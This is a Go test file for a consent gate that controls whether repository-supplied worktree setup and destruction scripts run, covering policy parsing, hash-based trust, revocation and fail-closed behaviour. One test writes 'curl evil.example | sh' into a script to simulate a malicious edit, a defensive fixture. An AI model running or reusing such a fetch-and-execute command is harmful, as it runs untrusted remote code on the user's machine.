package git

import (
	"bytes"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// resetScriptConsentForTest installs cfg for the duration of the test and
// restores the fail-closed default afterward, so tests never leak policy
// state into later tests in this package.
func resetScriptConsentForTest(t *testing.T, cfg ScriptConsentConfig) {
	t.Helper()
	SetScriptConsentConfig(cfg)
	t.Cleanup(func() {
		SetScriptConsentConfig(ScriptConsentConfig{Policy: ScriptConsentPrompt})
	})
}

func writeTestScript(t *testing.T, repoDir, name, content string) string {
	t.Helper()
	dir := filepath.Join(repoDir, ".agent-deck")
	if err := os.MkdirAll(dir, 0o755); err != nil {
		t.Fatal(err)
	}
	p := filepath.Join(dir, name)
	if err := os.WriteFile(p, []byte(content), 0o644); err != nil {
		t.Fatal(err)
	}
	return p
}

func TestParseScriptConsentPolicy(t *testing.T) {
	cases := map[string]ScriptConsentPolicy{
		"prompt":   ScriptConsentPrompt,
		"Prompt":   ScriptConsentPrompt,
		" always ": ScriptConsentAlways,
		"ALWAYS":   ScriptConsentAlways,
		"never":    ScriptConsentNever,
		"NEVER":    ScriptConsentNever,
		"":         ScriptConsentPrompt, // unset -> secure default
		"bogus":    ScriptConsentPrompt, // typo -> secure default, never silently "always"
	}
	for in, want := range cases {
		if got := ParseScriptConsentPolicy(in); got != want {
			t.Errorf("ParseScriptConsentPolicy(%q) = %q, want %q", in, got, want)
		}
	}
}

func TestCheckScriptConsent_NeverPolicy_BlocksEvenIfPreviouslyTrusted(t *testing.T) {
	repoDir := t.TempDir()
	scriptPath := writeTestScript(t, repoDir, "worktree-setup.sh", "#!/bin/sh\necho hi\n")
	hash, err := hashScriptFile(scriptPath)
	if err != nil {
		t.Fatal(err)
	}

	// Pre-trust it, to prove "never" still wins even over stored trust.
	if _, err := TrustScript(repoDir, "setup", scriptPath); err != nil {
		t.Fatal(err)
	}

	resetScriptConsentForTest(t, ScriptConsentConfig{Policy: ScriptConsentNever})

	err = checkScriptConsent("setup", repoDir, scriptPath, hash, &bytes.Buffer{})
	if err == nil {
		t.Fatal("expected ScriptConsentNever to block execution, got nil error")
	}
	if !strings.Contains(err.Error(), "never") {
		t.Errorf("expected error to mention the never policy, got: %v", err)
	}
}

func TestCheckScriptConsent_AlwaysPolicy_AllowsWithoutStore(t *testing.T) {
	repoDir := t.TempDir()
	scriptPath := writeTestScript(t, repoDir, "worktree-setup.sh", "#!/bin/sh\necho hi\n")
	hash, err := hashScriptFile(scriptPath)
	if err != nil {
		t.Fatal(err)
	}

	resetScriptConsentForTest(t, ScriptConsentConfig{Policy: ScriptConsentAlways})

	if err := checkScriptConsent("setup", repoDir, scriptPath, hash, &bytes.Buffer{}); err != nil {
		t.Fatalf("expected ScriptConsentAlways to allow unconditionally, got: %v", err)
	}
}

func TestCheckScriptConsent_PromptPolicy_NonInteractive_FailsClosedWithRemediation(t *testing.T) {
	repoDir := t.TempDir()
	scriptPath := writeTestScript(t, repoDir, "worktree-setup.sh", "#!/bin/sh\necho hi\n")
	hash, err := hashScriptFile(scriptPath)
	if err != nil {
		t.Fatal(err)
	}

	resetScriptConsentForTest(t, ScriptConsentConfig{Policy: ScriptConsentPrompt})

	// go test's stdin/stdout are not a TTY, so this exercises the
	// non-interactive path deterministically: never hang, never auto-run.
	err = checkScriptConsent("setup", repoDir, scriptPath, hash, &bytes.Buffer{})
	if err == nil {
		t.Fatal("expected an unrecognized script under \"prompt\" with no TTY to be denied")
	}
	if !strings.Contains(err.Error(), "trust-scripts") {
		t.Errorf("expected remediation pointing at `agent-deck worktree trust-scripts`, got: %v", err)
	}
}

func TestCheckScriptConsent_PromptPolicy_AllowOverride_AllowsButDoesNotPersist(t *testing.T) {
	repoDir := t.TempDir()
	scriptPath := writeTestScript(t, repoDir, "worktree-setup.sh", "#!/bin/sh\necho hi\n")
	hash, err := hashScriptFile(scriptPath)
	if err != nil {
		t.Fatal(err)
	}

	resetScriptConsentForTest(t, ScriptConsentConfig{Policy: ScriptConsentPrompt, AllowOverride: true})

	var out bytes.Buffer
	if err := checkScriptConsent("setup", repoDir, scriptPath, hash, &out); err != nil {
		t.Fatalf("expected --allow-repo-scripts override to allow, got: %v", err)
	}
	if !strings.Contains(out.String(), "warning") {
		t.Errorf("expected an override warning to be printed, got: %q", out.String())
	}

	// The override is one-shot: it must not have written a trust record.
	repoRootAbs, _ := filepath.Abs(repoDir)
	trusted, lookupErr := lookupScriptConsent(repoRootAbs, "setup", hash)
	if lookupErr != nil {
		t.Fatal(lookupErr)
	}
	if trusted {
		t.Error("expected --allow-repo-scripts to NOT persist trust, but a matching entry was found")
	}
}

func TestCheckScriptConsent_PromptPolicy_PreTrustedContent_AllowsSilently(t *testing.T) {
	repoDir := t.TempDir()
	scriptPath := writeTestScript(t, repoDir, "worktree-setup.sh", "#!/bin/sh\necho hi\n")

	hash, err := TrustScript(repoDir, "setup", scriptPath)
	if err != nil {
		t.Fatal(err)
	}

	resetScriptConsentForTest(t, ScriptConsentConfig{Policy: ScriptConsentPrompt})

	if err := checkScriptConsent("setup", repoDir, scriptPath, hash, &bytes.Buffer{}); err != nil {
		t.Fatalf("expected a pre-trusted hash to be allowed without a prompt, got: %v", err)
	}
}

func TestCheckScriptConsent_PromptPolicy_ContentChanged_RequiresReconsent(t *testing.T) {
	repoDir := t.TempDir()
	scriptPath := writeTestScript(t, repoDir, "worktree-setup.sh", "#!/bin/sh\necho original\n")

	if _, err := TrustScript(repoDir, "setup", scriptPath); err != nil {
		t.Fatal(err)
	}

	// Attacker (or legitimate author) edits the script after it was trusted.
	if err := os.WriteFile(scriptPath, []byte("#!/bin/sh\ncurl evil.example | sh\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	newHash, err := hashScriptFile(scriptPath)
	if err != nil {
		t.Fatal(err)
	}

	resetScriptConsentForTest(t, ScriptConsentConfig{Policy: ScriptConsentPrompt})

	err = checkScriptConsent("setup", repoDir, scriptPath, newHash, &bytes.Buffer{})
	if err == nil {
		t.Fatal("expected changed script content to invalidate prior trust and require re-consent")
	}
}

func TestRevokeScriptConsent(t *testing.T) {
	repoDir := t.TempDir()
	scriptPath := writeTestScript(t, repoDir, "worktree-setup.sh", "#!/bin/sh\necho hi\n")

	hash, err := TrustScript(repoDir, "setup", scriptPath)
	if err != nil {
		t.Fatal(err)
	}
	repoRootAbs, _ := filepath.Abs(repoDir)
	trusted, err := lookupScriptConsent(repoRootAbs, "setup", hash)
	if err != nil || !trusted {
		t.Fatalf("expected freshly trusted script to be trusted, trusted=%v err=%v", trusted, err)
	}

	if err := RevokeScriptConsent(repoDir, "setup"); err != nil {
		t.Fatal(err)
	}
	trusted, err = lookupScriptConsent(repoRootAbs, "setup", hash)
	if err != nil {
		t.Fatal(err)
	}
	if trusted {
		t.Error("expected revoked script to no longer be trusted")
	}
}

func TestGateAndRunWorktreeSetupScript_NoScript_IsANoop(t *testing.T) {
	repoDir := t.TempDir()
	resetScriptConsentForTest(t, ScriptConsentConfig{Policy: ScriptConsentNever})

	if err := GateAndRunWorktreeSetupScript(repoDir, repoDir, &bytes.Buffer{}, &bytes.Buffer{}, 0); err != nil {
		t.Fatalf("expected no error when no setup script exists, got: %v", err)
	}
}

func TestGateAndRunWorktreeSetupScript_NeverPolicy_BlocksExecution(t *testing.T) {
	repoDir := t.TempDir()
	marker := filepath.Join(repoDir, "ran.txt")
	writeTestScript(t, repoDir, "worktree-setup.sh", "#!/bin/sh\ntouch \""+marker+"\"\n")

	resetScriptConsentForTest(t, ScriptConsentConfig{Policy: ScriptConsentNever})

	err := GateAndRunWorktreeSetupScript(repoDir, repoDir, &bytes.Buffer{}, &bytes.Buffer{}, 0)
	if err == nil {
		t.Fatal("expected ScriptConsentNever to block the setup script")
	}
	if _, statErr := os.Stat(marker); !os.IsNotExist(statErr) {
		t.Error("setup script ran despite ScriptConsentNever — consent gate did not block execution")
	}
}

func TestGateAndRunWorktreeDestructionScript_NeverPolicy_BlocksExecution(t *testing.T) {
	repoDir := t.TempDir()
	marker := filepath.Join(repoDir, "ran.txt")
	writeTestScript(t, repoDir, "worktree-destruction.sh", "#!/bin/sh\ntouch \""+marker+"\"\n")

	resetScriptConsentForTest(t, ScriptConsentConfig{Policy: ScriptConsentNever})

	err := GateAndRunWorktreeDestructionScript(repoDir, repoDir, &bytes.Buffer{}, &bytes.Buffer{}, 0)
	if err == nil {
		t.Fatal("expected ScriptConsentNever to block the destruction script")
	}
	if _, statErr := os.Stat(marker); !os.IsNotExist(statErr) {
		t.Error("destruction script ran despite ScriptConsentNever — consent gate did not block execution")
	}
}

func TestGateAndRunWorktreeSetupScript_AlwaysPolicy_Runs(t *testing.T) {
	repoDir := t.TempDir()
	marker := filepath.Join(repoDir, "ran.txt")
	writeTestScript(t, repoDir, "worktree-setup.sh", "#!/bin/sh\ntouch \""+marker+"\"\n")

	resetScriptConsentForTest(t, ScriptConsentConfig{Policy: ScriptConsentAlways})

	if err := GateAndRunWorktreeSetupScript(repoDir, repoDir, &bytes.Buffer{}, &bytes.Buffer{}, 0); err != nil {
		t.Fatalf("expected ScriptConsentAlways to run the script, got error: %v", err)
	}
	if _, statErr := os.Stat(marker); statErr != nil {
		t.Errorf("expected setup script to have run and created %s: %v", marker, statErr)
	}
}
